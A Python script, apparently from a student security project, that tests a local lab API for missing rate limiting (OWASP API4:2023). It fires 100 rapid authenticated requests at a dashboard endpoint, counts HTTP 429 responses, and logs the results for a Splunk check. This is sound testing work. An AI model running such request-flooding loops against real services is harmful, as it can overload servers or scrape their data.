#!/usr/bin/env python3
"""
ATTACK 3: Unrestricted Resource Consumption - Rate Limiting
OWASP: API4:2023
What: Send too many requests too fast
How: Hammer dashboard endpoint with no delay
Why dangerous: Can crash server or scrape all data
"""
import requests
import time
import json
import datetime

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(token, count=100):
    print("=" * 55)
    print("ATTACK 3: RATE LIMITING ABUSE (API4:2023)")
    print("Unrestricted Resource Consumption")
    print("=" * 55)

    endpoint = TARGET + "/identity/api/v2/user/dashboard"
    headers = {"Authorization": "Bearer " + token}

    success = 0
    throttled = 0
    start_time = time.time()

    print("[*] Target: " + endpoint)
    print("[*] Sending " + str(count) + " rapid requests...\n")

    for i in range(count):
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            if r.status_code == 200:
                success += 1
            elif r.status_code == 429:
                throttled += 1
                print("[THROTTLED] Rate limit enforced at request " + str(i))
        except Exception as e:
            print("[ERROR] " + str(e))

    elapsed = time.time() - start_time
    rate = round(count / elapsed, 1)

    print("[RESULT] " + str(success) + "/" + str(count) + " succeeded")
    print("[RESULT] " + str(throttled) + " throttled")
    print("[RESULT] Rate: " + str(rate) + " requests/second")
    print("[RESULT] No rate limiting = vulnerability confirmed!")
    print("[SEVERITY] HIGH")
    print("[SPLUNK] Check: index=api_logs user/dashboard")

    result = {
        "attack": "Rate Limiting Abuse",
        "owasp": "API4:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "endpoint": endpoint,
        "requests": count,
        "successful": success,
        "throttled": throttled,
        "requests_per_second": rate,
        "elapsed_seconds": round(elapsed, 2),
        "severity": "HIGH"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack3_ratelimit_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
